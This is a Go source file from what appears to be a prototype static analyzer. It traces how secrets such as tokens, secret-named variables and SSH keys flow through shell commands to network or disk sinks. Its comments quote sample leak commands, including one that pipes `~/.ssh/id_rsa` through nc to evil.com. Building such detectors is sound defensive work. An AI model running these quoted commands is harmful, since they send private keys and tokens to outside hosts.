package main

import (
	"strings"

	"mvdan.cc/sh/v3/syntax"
)

// The analyzer walks the AST once, in source order, carrying an environment
// of variable bindings. Every shell word is evaluated to a Value (see
// value.go); when a Value that carries flows lands in an exposing argument
// slot (see knowledge.go), a Finding is recorded.
//
// Source order matters. `TOKEN=$(gh auth token); curl ... "$TOKEN"` only
// resolves if the assignment in the first statement is processed before the
// expansion in the second, which is why this is a hand-written ordered walk
// rather than a syntax.Walk over the whole file.

// Finding is one sensitive flow that reached a place where it is exposed.
type Finding struct {
	Flow     Flow   `json:"flow"`
	Command  string `json:"command"` // "curl"
	Arg      string `json:"arg"`     // "-H", or "positional"
	Slot     Slot   `json:"-"`
	SlotName string `json:"slot"`
	Emits    string `json:"emits"` // "the network"
	Span     Span   `json:"span"`  // the argument word
}

// Note is something the analyzer saw but could not resolve. Notes exist so
// that the limits of the analysis are visible in the output instead of being
// silently reported as "no flows found".
type Note struct {
	Text string `json:"text"`
	Span Span   `json:"span"`
}

// Analyzer holds the state of one analysis run.
type Analyzer struct {
	src string

	// env maps a variable name to whatever was last assigned to it. This is
	// a flat, flow-insensitive environment: no branch tracking, no scopes.
	env map[string]Value

	Findings []Finding `json:"findings"`
	Notes    []Note    `json:"notes"`
}

// Analyze parses a command and maps the flow of sensitive data through it.
func Analyze(src string) (*Analyzer, error) {
	file, err := syntax.NewParser().Parse(strings.NewReader(src), "")
	if err != nil {
		return nil, err
	}
	a := &Analyzer{src: src, env: map[string]Value{}}
	a.stmts(file.Stmts, Value{})
	return a, nil
}

func (a *Analyzer) span(n syntax.Node) Span {
	return Span{Start: n.Pos().Offset(), End: n.End().Offset()}
}

// text returns the original source covered by a node, which makes report
// labels read like the command the user actually typed.
func (a *Analyzer) text(n syntax.Node) string {
	s := a.span(n)
	if int(s.End) > len(a.src) || s.Start > s.End {
		return ""
	}
	return a.src[s.Start:s.End]
}

func (a *Analyzer) note(text string, n syntax.Node) {
	a.Notes = append(a.Notes, Note{Text: text, Span: a.span(n)})
}

// ------------------------------------------------------------- statements

// stmts walks a statement list in order and returns the union of what they
// print. Union rather than "last statement wins" because `$(a; b)` captures
// the output of both, and over-approximating is the safe direction.
func (a *Analyzer) stmts(list []*syntax.Stmt, stdin Value) Value {
	var out Value
	for _, s := range list {
		out = union(out, a.stmt(s, stdin))
	}
	return out
}

// stmt evaluates one statement and returns its stdout.
func (a *Analyzer) stmt(s *syntax.Stmt, stdin Value) Value {
	stdin = union(stdin, a.inputRedirs(s))
	out := a.command(s.Cmd, stdin)
	a.outputRedirs(s, out)
	return out
}

// fd returns the file descriptor a redirect applies to, using the shell's
// default when none is written: 0 for input, 1 for output.
func fd(r *syntax.Redirect, dflt string) string {
	if r.N == nil {
		return dflt
	}
	return r.N.Value
}

// capturesStdout reports whether a redirect captures the command's stdout.
//
// This distinction is not cosmetic. `2>/dev/null` redirects stderr, and it
// appears throughout real CI commands; reading it as a stdout redirect turns
// every `env | grep TOKEN 2>/dev/null` into a reported disk leak.
func capturesStdout(r *syntax.Redirect) bool {
	switch r.Op {
	case syntax.RdrOut, syntax.AppOut, syntax.ClbOut:
		return fd(r, "1") == "1"
	case syntax.RdrAll, syntax.AppAll:
		// `&>` and `&>>` capture stdout and stderr together.
		return true
	}
	return false
}

// suppliesStdin reports whether a redirect feeds the command's stdin.
func suppliesStdin(r *syntax.Redirect) bool {
	switch r.Op {
	case syntax.RdrIn, syntax.WordHdoc, syntax.Hdoc, syntax.DashHdoc:
		return fd(r, "0") == "0"
	}
	return false
}

// inputRedirs collects data arriving via `< file` and `<<< "$TOKEN"`.
func (a *Analyzer) inputRedirs(s *syntax.Stmt) Value {
	var in Value
	for _, r := range s.Redirs {
		if !suppliesStdin(r) {
			continue
		}
		if r.Op == syntax.Hdoc || r.Op == syntax.DashHdoc {
			if r.Hdoc != nil {
				in = union(in, a.word(r.Hdoc).then("supplied by here-document", a.span(r)))
			}
			continue
		}
		in = union(in, a.word(r.Word).then("redirected into the command's stdin", a.span(r)))
	}
	return in
}

// outputRedirs routes a command's stdout into `> file`, which is a sink: the
// data is now sitting on disk where it was not before.
func (a *Analyzer) outputRedirs(s *syntax.Stmt, out Value) {
	for _, r := range s.Redirs {
		if !capturesStdout(r) {
			continue
		}
		target := a.text(r.Word)
		if isDiscard(target) {
			continue
		}
		for _, f := range out.Flows {
			a.Findings = append(a.Findings, Finding{
				Flow:     f.then("redirected to "+target, a.span(r)),
				Command:  "redirect",
				Arg:      ">",
				Slot:     SlotDisk,
				SlotName: SlotDisk.String(),
				Emits:    "the file " + target,
				Span:     a.span(r),
			})
		}
	}
}

// command dispatches on the kind of shell command. Only the constructs a
// prototype needs are handled; anything else is recursed into for its
// statements, and control flow is ignored.
func (a *Analyzer) command(c syntax.Command, stdin Value) Value {
	switch x := c.(type) {
	case nil:
		return Value{}

	case *syntax.CallExpr:
		return a.call(x, stdin)

	case *syntax.BinaryCmd:
		// A pipe is the one operator that moves data: the left side's stdout
		// becomes the right side's stdin. && and || only sequence.
		if x.Op == syntax.Pipe || x.Op == syntax.PipeAll {
			left := a.stmt(x.X, stdin)
			return a.stmt(x.Y, left.then("piped into the next command", a.span(x)))
		}
		a.stmt(x.X, stdin)
		return a.stmt(x.Y, stdin)

	case *syntax.Subshell:
		return a.stmts(x.Stmts, stdin)
	case *syntax.Block:
		return a.stmts(x.Stmts, stdin)

	case *syntax.IfClause:
		a.stmts(x.Cond, stdin)
		out := a.stmts(x.Then, stdin)
		if x.Else != nil {
			out = union(out, a.command(x.Else, stdin))
		}
		return out

	case *syntax.WhileClause:
		a.stmts(x.Cond, stdin)
		return a.stmts(x.Do, stdin)
	case *syntax.ForClause:
		return a.stmts(x.Do, stdin)
	case *syntax.DeclClause:
		// `export TOKEN=$(gh auth token)`, and the same for declare, local,
		// readonly and typeset. The declaring keyword does not change the
		// data flow; the assignments it carries are the whole point, and
		// without this the chain from producer to sink is silently lost.
		for _, as := range x.Args {
			if as.Naked {
				// `export TOKEN` re-exports an existing variable rather than
				// assigning to it, so there is no new value to track.
				continue
			}
			a.assign(as)
		}
		return Value{}

	case *syntax.FuncDecl:
		// Bodies are analyzed, but calls to the function are not linked back
		// to it. Interprocedural flow is out of scope for the prototype.
		a.note("function body analyzed, but calls to it are not traced", x)
		return a.stmt(x.Body, Value{})

	default:
		a.note("unhandled shell construct; data flow through it is not traced", c)
		return Value{}
	}
}

// ---------------------------------------------------------------- commands

// call handles `NAME=value ... cmd arg arg`, which covers both a bare
// assignment and an actual command invocation.
func (a *Analyzer) call(c *syntax.CallExpr, stdin Value) Value {
	for _, as := range c.Assigns {
		a.assign(as)
	}
	if len(c.Args) == 0 {
		return Value{}
	}

	name := a.text(c.Args[0])
	args := c.Args[1:]

	// Resolve the command path (`gh auth token`) against the knowledge base.
	leading := make([]string, len(args))
	for i, w := range args {
		leading[i] = a.text(w)
	}
	spec, consumed, known := Lookup(name, leading)
	if !known {
		return a.unknownCommand(c, name, args, stdin)
	}
	// Report against the full path that was matched, so a finding reads
	// "gh issue comment --body" rather than just "gh --body".
	fullName := strings.TrimSpace(name + " " + strings.Join(leading[:consumed], " "))
	args = args[consumed:]

	// Evaluate every argument once, then decide what each one means.
	values := make([]Value, len(args))
	for i, w := range args {
		values[i] = a.word(w)
	}

	out := a.commandOutput(spec, c, args, values, stdin)
	a.recordSinks(spec, fullName, c, args, values, stdin)
	return out
}

// commandOutput works out what the command prints, which is what a command
// substitution or a pipe will pick up.
func (a *Analyzer) commandOutput(spec *Spec, c *syntax.CallExpr, args []*syntax.Word, values []Value, stdin Value) Value {
	var out Value

	if spec.Produces != "" {
		label := a.text(c)
		out = union(out, Value{Flows: []Flow{{
			Origin: label,
			Why:    spec.Produces,
			Span:   a.span(c),
		}}})
	}
	if spec.ReadsFiles {
		// Sensitivity comes from the paths, which a.word already evaluated.
		for i := range args {
			out = union(out, values[i].then("read and printed on stdout", a.span(args[i])))
		}
	}
	if spec.PrintsArgs {
		for i := range args {
			out = union(out, values[i].then("printed on stdout by "+a.text(c.Args[0]), a.span(args[i])))
		}
	}
	if spec.PassesStdin {
		out = union(out, stdin.then("passed through "+a.text(c.Args[0]), a.span(c.Args[0])))
	}
	return out
}

// recordSinks binds arguments to slots and records every sensitive value that
// landed somewhere it is exposed.
func (a *Analyzer) recordSinks(spec *Spec, name string, c *syntax.CallExpr, args []*syntax.Word, values []Value, stdin Value) {
	if spec.Emits == "" {
		return
	}

	// A command whose payload arrives on stdin has no argument to attribute
	// the flow to, so it is recorded against the command itself. Without
	// this, `cat ~/.ssh/id_rsa | nc evil.com 443` would report nothing --
	// a declared sink silently swallowing a flow, which is worse than an
	// unknown command.
	if spec.StdinSlot != SlotNone {
		for _, f := range stdin.Flows {
			a.Findings = append(a.Findings, Finding{
				Flow:     f.then("consumed from stdin by "+name+" ("+spec.StdinSlot.String()+" slot)", a.span(c)),
				Command:  name,
				Arg:      "stdin",
				Slot:     spec.StdinSlot,
				SlotName: spec.StdinSlot.String(),
				Emits:    spec.Emits,
				Span:     a.span(c),
			})
		}
	}

	for _, b := range bindArgs(a, spec, args, values) {
		if b.slot == SlotNone {
			continue
		}
		v := values[b.index]

		// `curl -d @-` reads the payload from stdin, so a piped-in secret
		// lands in this slot too.
		if b.fromStdin {
			v = union(v, stdin)
		}

		for _, f := range v.Flows {
			a.Findings = append(a.Findings, Finding{
				Flow:     f.then("used as "+name+" "+b.flag+" ("+b.slot.String()+" slot)", a.span(args[b.index])),
				Command:  name,
				Arg:      b.flag,
				Slot:     b.slot,
				SlotName: b.slot.String(),
				Emits:    spec.Emits,
				Span:     a.span(args[b.index]),
			})
		}
		for _, u := range v.Unknowns {
			a.note("value from unknown command `"+u.Command+"` reaches "+name+" "+b.flag+
				"; its sensitivity cannot be determined", args[b.index])
		}
	}
}

// unknownCommand handles a command the knowledge base has never seen. It is
// never treated as safe: sensitive input passing through it stays sensitive,
// and the fact that it was unknown is carried in the Value.
func (a *Analyzer) unknownCommand(c *syntax.CallExpr, name string, args []*syntax.Word, stdin Value) Value {
	var in Value
	for _, w := range args {
		in = union(in, a.word(w))
	}
	in = union(in, stdin)

	if !in.empty() {
		a.note("sensitive data reaches unknown command `"+name+"`; where it goes is not known", c)
	}
	out := in.then("passed through unknown command `"+name+"`", a.span(c))
	out.Unknowns = append(out.Unknowns, Unknown{
		Command: name,
		Reason:  "not in the knowledge base",
		Span:    a.span(c),
	})
	return out
}

// assign records `NAME=value`, the hop that makes the second example work.
func (a *Analyzer) assign(as *syntax.Assign) {
	if as.Name == nil {
		return
	}
	name := as.Name.Value

	var v Value
	if as.Value != nil {
		v = a.word(as.Value)
	}

	// A variable named like a secret is treated as a source in its own right,
	// so `TOKEN=hunter2` is tracked even though the literal is opaque.
	if v.empty() && secretVarNames.MatchString(name) {
		v = Value{Flows: []Flow{{
			Origin: a.text(as),
			Why:    "variable is named like a secret (heuristic)",
			Span:   a.span(as),
		}}}
	}

	if as.Append {
		v = union(a.env[name], v)
	}
	a.env[name] = v.then("assigned to $"+name, a.span(as))
}

// -------------------------------------------------------------------- words

// word evaluates a shell word to the sensitive data it carries. This is where
// command substitution, variable expansion and process substitution are
// turned into flow edges.
func (a *Analyzer) word(w *syntax.Word) Value {
	if w == nil {
		return Value{}
	}
	return a.parts(w.Parts)
}

func (a *Analyzer) parts(parts []syntax.WordPart) Value {
	var out Value
	for _, p := range parts {
		out = union(out, a.part(p))
	}
	return out
}

func (a *Analyzer) part(p syntax.WordPart) Value {
	switch x := p.(type) {

	case *syntax.Lit:
		// A bare path that names a credential file is a source.
		if secretPaths.MatchString(x.Value) {
			return Value{Flows: []Flow{{
				Origin: x.Value,
				Why:    "path names a credential file (heuristic)",
				Span:   a.span(x),
			}}}
		}
		return Value{}

	case *syntax.SglQuoted:
		// Single quotes suppress every expansion, so there is nothing to
		// trace; the literal itself is still checked.
		if secretPaths.MatchString(x.Value) {
			return Value{Flows: []Flow{{
				Origin: x.Value,
				Why:    "path names a credential file (heuristic)",
				Span:   a.span(x),
			}}}
		}
		return Value{}

	case *syntax.DblQuoted:
		return a.parts(x.Parts)

	case *syntax.ParamExp:
		return a.paramExp(x)

	case *syntax.CmdSubst:
		// $(...) and `...`: whatever the inner commands print becomes part
		// of this word.
		inner := a.stmts(x.Stmts, Value{})
		return inner.then("captured by command substitution", a.span(x))

	case *syntax.ProcSubst:
		// <(...) exposes the inner command's output as a file path, which is
		// then read by whatever receives the argument.
		inner := a.stmts(x.Stmts, Value{})
		return inner.then("exposed as a file by process substitution", a.span(x))

	case *syntax.ExtGlob, *syntax.ArithmExp:
		return Value{}

	default:
		return Value{}
	}
}

// paramExp resolves $NAME against the environment built so far. Because the
// parser hands back a structured node, this is a map lookup rather than a
// regex over the raw text.
func (a *Analyzer) paramExp(x *syntax.ParamExp) Value {
	if x.Param == nil {
		return Value{}
	}
	name := x.Param.Value

	if v, ok := a.env[name]; ok {
		return v.then("expanded as $"+name, a.span(x))
	}
	// Not assigned in this command, so it comes from the ambient environment.
	if secretVarNames.MatchString(name) {
		return Value{Flows: []Flow{{
			Origin: "$" + name,
			Why:    "environment variable named like a secret (heuristic)",
			Span:   a.span(x),
		}}}
	}
	return Value{}
}

// ---------------------------------------------------------------- arguments

// binding says that argument args[index] lands in slot, because of flag.
type binding struct {
	index     int
	slot      Slot
	flag      string
	fromStdin bool // the argument is `@-` or `-`, meaning "read stdin"
}

// bindArgs associates each argument word with the slot it occupies.
//
// It handles the four shapes that appear in practice:
//
//	curl -H value          flag and value are separate words
//	curl --data=value      value attached with '='
//	curl -sH value         clustered short flags, last one takes the value
//	curl -d@file           value attached directly to a short flag
//
// Any flag not listed in the spec is assumed to be a boolean switch. That
// assumption can mis-assign the following word, so it is recorded as a note.
func bindArgs(a *Analyzer, spec *Spec, args []*syntax.Word, values []Value) []binding {
	// guessed reports an assumption about an unrecognised flag, but only when
	// the word it affects actually carries sensitive data. A note on every
	// boolean switch (`curl -s`) would bury the ones that matter.
	guessed := func(i int, text string) {
		if i < len(values) && !values[i].empty() {
			a.note("unrecognised flag `"+text+"`; assumed not to take a value, so the "+
				"following argument may be attributed to the wrong slot", args[i])
		}
	}

	var out []binding

	// bind records that args[i] lands in a slot. valueText is the part of the
	// argument that is actually the value -- the whole word for `-H value`,
	// but only what follows "=" for `--header=value`.
	bind := func(i int, rule SlotRule, flag, valueText string) {
		s := rule.resolve(valueText)
		fromStdin := false
		if flag != positionalArg {
			// `curl -d @-` and `curl -T -` take the payload from stdin.
			fromStdin = valueText == "@-" || valueText == "-"
			// `curl -d @file` uploads the file's contents, not the literal.
			if strings.HasPrefix(valueText, "@") && !fromStdin && s == SlotContent {
				s = SlotFile
			}
		}
		out = append(out, binding{index: i, slot: s, flag: flag, fromStdin: fromStdin})
	}

	for i := 0; i < len(args); i++ {
		lead := leadingLit(a, args[i])
		full := a.text(args[i])

		if !strings.HasPrefix(lead, "-") || lead == "-" || lead == "--" {
			bind(i, slot(spec.Positional), positionalArg, full)
			continue
		}

		// --flag=value : the value lives inside this same word.
		if strings.HasPrefix(lead, "--") && strings.Contains(lead, "=") {
			name, _, _ := strings.Cut(lead, "=")
			_, value, _ := strings.Cut(full, "=")
			if rule, known := spec.Flags[name]; known {
				bind(i, rule, name, value)
			} else if !values[i].empty() {
				a.note("unknown flag `"+name+"` for this command; its value is not traced", args[i])
			}
			continue
		}

		// --flag value / -f value
		if rule, known := spec.Flags[lead]; known {
			if i+1 < len(args) {
				bind(i+1, rule, lead, a.text(args[i+1]))
				i++
			}
			continue
		}

		if strings.HasPrefix(lead, "--") {
			guessed(i+1, lead)
			continue
		}

		// Clustered short flags (-sH): scan for the first one that takes a
		// value; everything before it is assumed to be a boolean switch.
		rest := lead[1:]
		matched := false
		for j := 0; j < len(rest); j++ {
			flag := "-" + string(rest[j])
			rule, known := spec.Flags[flag]
			if !known {
				continue
			}
			matched = true
			if j+1 < len(rest) {
				// -d@file : the value is attached to the flag in this word.
				bind(i, rule, flag, full[2+j:])
			} else if i+1 < len(args) {
				bind(i+1, rule, flag, a.text(args[i+1]))
				i++
			}
			break
		}
		if !matched {
			// None of the clustered letters is a flag this spec knows, so
			// whether one of them takes the next word is a guess. Say so,
			// rather than letting that word fall through to the positional
			// slot and be reported with the wrong reason.
			guessed(i+1, lead)
		}
	}
	return out
}

// positionalArg is the label used for arguments that are not flag values.
const positionalArg = "positional"

// leadingLit returns the literal prefix of a word, which is what identifies a
// flag. For `--data=$TOKEN` that is "--data=", the part before the expansion.
func leadingLit(a *Analyzer, w *syntax.Word) string {
	if w == nil || len(w.Parts) == 0 {
		return ""
	}
	if lit, ok := w.Parts[0].(*syntax.Lit); ok {
		return lit.Value
	}
	return ""
}
